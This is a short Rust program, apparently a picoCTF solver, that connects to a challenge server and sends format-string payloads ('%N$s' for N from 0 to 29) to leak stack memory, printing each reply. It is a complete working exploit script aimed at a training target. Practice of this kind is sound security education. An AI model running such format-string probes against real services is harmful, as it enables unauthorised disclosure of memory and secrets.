use tokio::io::{AsyncReadExt, AsyncWriteExt, BufReader};
use tokio::net::TcpStream;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    for i in 0..30 {
        let mut remote = Remote::new("saturn.picoctf.net", 50451).await?;
        remote.recvuntil(">> ").await?;
        let payload = format!("%{}$s", i);
        println!("{}", payload);
        remote.sendline(&payload).await?;
        let res = remote.recvall().await?;
        // Print as string if it is valid UTF-8, otherwise print bytes
        match String::from_utf8(res.clone()) {
            Ok(v) => println!("{}", v),
            Err(_e) => println!("{:?}", res),
        }
    }
    Ok(())
}

pub struct Remote {
    stream: BufReader<TcpStream>,
}

impl Remote {
    pub async fn new(address: &str, port: u16) -> Result<Remote, Box<dyn std::error::Error>> {
        let addr = format!("{}:{}", address, port);
        let stream = TcpStream::connect(&addr).await?;
        Ok(Remote {
            stream: BufReader::new(stream),
        })
    }

    pub async fn recvuntil(&mut self, pattern: &str) -> Result<String, Box<dyn std::error::Error>> {
        let mut buffer = String::new();
        while !buffer.ends_with(pattern) {
            buffer.push(self.stream.read_u8().await? as char);
        }
        Ok(buffer)
    }

    pub async fn sendline(&mut self, data: &str) -> Result<(), Box<dyn std::error::Error>> {
        self.stream
            .get_mut()
            .write_all(format!("{}\n", data).as_bytes())
            .await?;
        Ok(())
    }

    pub async fn recvall(&mut self) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
        let mut buffer = Vec::new();
        self.stream.read_to_end(&mut buffer).await?;
        Ok(buffer)
    }
}
